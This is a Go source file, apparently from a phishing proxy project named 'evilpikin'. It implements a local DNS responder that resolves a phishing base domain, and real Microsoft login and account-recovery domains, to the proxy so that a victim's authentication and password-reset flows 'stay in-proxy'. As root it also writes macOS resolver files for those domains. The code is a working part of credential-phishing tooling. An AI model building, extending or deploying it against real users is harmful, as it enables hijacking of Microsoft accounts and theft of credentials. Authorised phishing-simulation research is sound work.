package dns

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/user/evilpikin/internal/log"
)

// Server is a minimal UDP DNS responder for the phishing base domain. It
// answers A queries for the base domain and any of its subdomains with
// 127.0.0.1, so operators never have to enumerate every dynamically generated
// <host>.<BaseDomain> alias in /etc/hosts. It can additionally intercept a set
// of REAL Microsoft auth domain suffixes (e.g. login.live.com, account.live.com)
// so password-reset / account-recovery flows that bounce the victim onto a real
// Microsoft host stay in-proxy. All other queries get an empty NOERROR reply.
type Server struct {
	baseDomain      string
	interceptDomains []string
	addr            string
	mu              sync.Mutex
	pc              net.PacketConn
}

// NewServer builds a DNS server for baseDomain (e.g. "ms.test"). addr is the
// UDP listen address, typically "127.0.0.1:53".
func NewServer(baseDomain, addr string) *Server {
	if baseDomain == "" {
		baseDomain = "ms.test"
	}
	return &Server{baseDomain: strings.ToLower(baseDomain), addr: addr}
}

// SetInterceptDomains configures the real domain suffixes the server answers
// with 127.0.0.1 (in addition to the *.<baseDomain> subtree). This is the
// "strongest wildcard": any Microsoft auth host introduced by the live site
// (password reset, MSA recovery) is resolved to the proxy without pre-listing.
func (s *Server) SetInterceptDomains(domains []string) {
	lower := make([]string, 0, len(domains))
	for _, d := range domains {
		d = strings.ToLower(strings.TrimSpace(d))
		if d != "" {
			lower = append(lower, d)
		}
	}
	s.interceptDomains = lower
}

// Start binds the UDP socket and begins serving. It binds only the configured
// address (typically 127.0.0.1:53, which requires root); on failure it logs the
// exact /etc/resolver command the operator must run once with sudo. It never
// spawns a phantom server on another port.
func (s *Server) Start() {
	pc, err := net.ListenPacket("udp", s.addr)
	if err != nil {
		log.Error("dns: cannot bind %s: %v", s.addr, err)
		s.logResolverCommand(s.addr)
		return
	}
	s.mu.Lock()
	s.pc = pc
	s.mu.Unlock()
	log.Info("dns: serving *.%s -> 127.0.0.1 on %s", s.baseDomain, s.addr)
	go s.serve(pc)
	s.setupResolver()
}

func (s *Server) serve(pc net.PacketConn) {
	buf := make([]byte, 512)
	for {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			return
		}
		if resp, ok := s.handle(buf[:n]); ok {
			pc.WriteTo(resp, addr)
		}
	}
}

func (s *Server) handle(req []byte) ([]byte, bool) {
	if len(req) < 12 {
		return nil, false
	}
	name, qtype, qEnd, ok := parseQuestion(req, 12)
	if !ok {
		return nil, false
	}
	// Only answer A (1) / ANY (255) for our domain subtree; everything else
	// (AAAA, etc.) gets an empty NOERROR so the browser falls back cleanly.
	if qtype != 1 && qtype != 255 {
		return buildReply(req, qEnd, 0, nil), true
	}
	if !s.inDomain(name) {
		return buildReply(req, qEnd, 0, nil), true
	}
	return buildReply(req, qEnd, 1, net.IPv4(127, 0, 0, 1)), true
}

func (s *Server) inDomain(name string) bool {
	name = strings.ToLower(strings.TrimSuffix(name, "."))
	if name == s.baseDomain {
		return true
	}
	if strings.HasSuffix(name, "."+s.baseDomain) {
		return true
	}
	for _, d := range s.interceptDomains {
		if name == d || strings.HasSuffix(name, "."+d) {
			return true
		}
	}
	return false
}

func parseQuestion(req []byte, off int) (name string, qtype uint16, end int, ok bool) {
	var sb strings.Builder
	for {
		if off >= len(req) {
			return "", 0, 0, false
		}
		llen := int(req[off])
		if llen == 0 {
			off++
			break
		}
		if llen&0xC0 == 0xC0 { // compression pointer (unexpected in question)
			off += 2
			break
		}
		off++
		if off+llen > len(req) {
			return "", 0, 0, false
		}
		sb.Write(req[off : off+llen])
		sb.WriteByte('.')
		off += llen
	}
	if off+4 > len(req) {
		return "", 0, 0, false
	}
	qtype = binary.BigEndian.Uint16(req[off : off+2])
	off += 4 // qtype + qclass
	return strings.TrimSuffix(sb.String(), "."), qtype, off, true
}

func buildReply(req []byte, qEnd, ancount int, ip net.IP) []byte {
	header := make([]byte, 12)
	copy(header, req[:12])
	// QR=1, AA=1, RD echoed; RA=0, RCODE=0.
	header[2] = 0x84 | 0x01 // QR(0x80) | AA(0x04) | RD(0x01)
	header[3] = 0x00
	binary.BigEndian.PutUint16(header[4:6], 1) // QDCOUNT
	binary.BigEndian.PutUint16(header[6:8], uint16(ancount))
	out := append(header, req[12:qEnd]...)
	if ancount == 1 && ip != nil {
		v4 := ip.To4()
		out = append(out, 0xC0, 0x0C)             // NAME pointer to question
		out = append(out, 0x00, 0x01)             // TYPE A
		out = append(out, 0x00, 0x01)             // CLASS IN
		out = append(out, 0x00, 0x00, 0x00, 0x3c) // TTL 60
		out = append(out, 0x00, 0x04)             // RDLENGTH
		out = append(out, v4...)
	}
	return out
}

// setupResolver writes /etc/resolver/<baseDomain> when running as root so
// macOS routes *.<baseDomain> to this server automatically. Otherwise it logs
// the one-line sudo command the operator must run once.
func (s *Server) setupResolver() {
	content := fmt.Sprintf("nameserver 127.0.0.1\nport %s\n", portOf(s.addr))
	if os.Getuid() == 0 {
		wroteAny := false
		writeResolver := func(domain string) {
			path := "/etc/resolver/" + domain
			if err := os.MkdirAll("/etc/resolver", 0755); err == nil {
				if err := os.WriteFile(path, []byte(content), 0644); err == nil {
					log.Info("dns: wrote %s (%s -> 127.0.0.1)", path, domain)
					wroteAny = true
				}
			}
		}
		writeResolver(s.baseDomain)
		for _, d := range s.interceptDomains {
			writeResolver(d)
		}
		if wroteAny {
			return
		}
	}
	s.logResolverCommand(s.addr)
}

func (s *Server) logResolverCommand(addr string) {
	content := fmt.Sprintf("nameserver 127.0.0.1\nport %s", portOf(addr))
	log.Info("dns: to resolve *.%s locally, run once with sudo:\n  echo '%s' | sudo tee /etc/resolver/%s",
		s.baseDomain, content, s.baseDomain)
}

func portOf(addr string) string {
	if _, port, err := net.SplitHostPort(addr); err == nil && port != "" {
		return port
	}
	return "53"
}
